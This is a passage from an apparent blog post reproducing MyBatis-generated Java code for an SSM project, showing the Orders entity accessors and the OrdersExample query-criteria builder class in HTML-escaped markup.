        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; userId;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setUserId(Integer userId) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.userId =&lt;span&gt; userId;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getNumber() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; number;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setNumber(String number) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.number = number == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : number.trim();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Date getCreatetime() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; createtime;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setCreatetime(Date createtime) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.createtime =&lt;span&gt; createtime;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getNote() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; note;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setNote(String note) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.note = note == &lt;span&gt;null&lt;/span&gt; ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : note.trim();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;OrdersExample.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;184&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.ArrayList;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Date;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OrdersExample {
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; String orderByClause;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; oredCriteria;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; OrdersExample() {
        oredCriteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criteria&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setOrderByClause(String orderByClause) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.orderByClause =&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getOrderByClause() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setDistinct(&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.distinct =&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isDistinct() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; getOredCriteria() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oredCriteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; or(Criteria criteria) {
        oredCriteria.add(criteria);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria or() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        oredCriteria.add(criteria);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria createCriteria() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oredCriteria.size() == 0&lt;span&gt;) {
            oredCriteria.add(criteria);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria createCriteriaInternal() {
        Criteria criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criteria();
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {
        oredCriteria.clear();
        orderByClause &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        distinct &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GeneratedCriteria {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; criteria;

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; GeneratedCriteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criterion&amp;gt;&lt;span&gt;();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isValid() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; criteria.size() &amp;gt; 0&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getAllCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (condition == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for condition cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value1, Object value2, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value1 == &lt;span&gt;null&lt;/span&gt; || value2 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Between values for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value1, value2));
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNull() {
            addCriterion(&lt;/span&gt;&quot;id is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;id is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id =&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;id in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdNotIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;id not in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id not between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdIsNull() {
            addCriterion(&lt;/span&gt;&quot;user_id is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;user_id is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id =&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdNotEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id &amp;lt;&amp;gt;&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdGreaterThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id &amp;gt;&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdGreaterThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id &amp;gt;=&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdLessThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id &amp;lt;&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdLessThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;user_id &amp;lt;=&quot;, value, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andUserIdIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;user_id in&quot;, values, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andUserIdNotIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;user_id not in&quot;, values, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;user_id between&quot;, value1, value2, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andUserIdNotBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;user_id not between&quot;, value1, value2, &quot;userId&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberIsNull() {
            addCriterion(&lt;/span&gt;&quot;number is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;number is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;number =&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;number &amp;lt;&amp;gt;&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;number &amp;gt;&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;number &amp;gt;=&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;number &amp;lt;&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;number &amp;lt;=&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberLike(String value) {
            addCriterion(&lt;/span&gt;&quot;number like&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;number not like&quot;, value, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNumberIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;number in&quot;, values, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNumberNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;number not in&quot;, values, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;number between&quot;, value1, value2, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNumberNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;number not between&quot;, value1, value2, &quot;number&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeIsNull() {
            addCriterion(&lt;/span&gt;&quot;createtime is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;createtime is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime =&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeNotEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;&amp;gt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeGreaterThan(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;gt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeGreaterThanOrEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;gt;=&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeLessThan(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeLessThanOrEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;=&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andCreatetimeIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;createtime in&quot;, values, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andCreatetimeNotIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;createtime not in&quot;, values, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeBetween(Date value1, Date value2) {
            addCriterion(&lt;/span&gt;&quot;createtime between&quot;, value1, value2, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeNotBetween(Date value1, Date value2) {
            addCriterion(&lt;/span&gt;&quot;createtime not between&quot;, value1, value2, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteIsNull() {
            addCriterion(&lt;/span&gt;&quot;note is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;note is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;note =&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;note &amp;lt;&amp;gt;&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNoteGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;note &amp;gt;&quot;, value, &quot;note&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

